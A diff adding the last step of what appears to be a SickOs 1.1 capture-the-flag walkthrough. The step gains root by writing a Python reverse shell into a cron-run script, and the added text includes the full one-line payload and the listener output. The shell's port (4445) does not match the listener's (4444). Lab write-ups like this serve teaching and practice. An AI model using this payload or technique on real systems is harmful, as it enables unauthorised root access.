@@ -163,9 +163,37 @@ www-data@SickOs:/var/www$ cat /etc/cron.d/automate
 * * * * * root /usr/bin/python /var/www/connect.py
 ```
 
+start another listener and just paste a python reverse shell in this file :
 
+```python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.127.128",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+```
 
+wait for a minute and you will get the root shell and find the flag in /root:
 
+```text
+root㉿kali:~#nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.127.128] from (UNKNOWN) [192.168.127.229] 41760
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+# ls /root 
+ls /root
+a0216ea4d51874464078c618298b1367.txt
+
+# cat /root/a0216ea4d51874464078c618298b1367.txt
+cat /root/a0216ea4d51874464078c618298b1367.txt
+If you are viewing this!!
+
+ROOT!
+
+You have Succesfully completed SickOS1.1.
+Thanks for Trying
+```
+
+this is how you can hack this machine :)
 
 
 
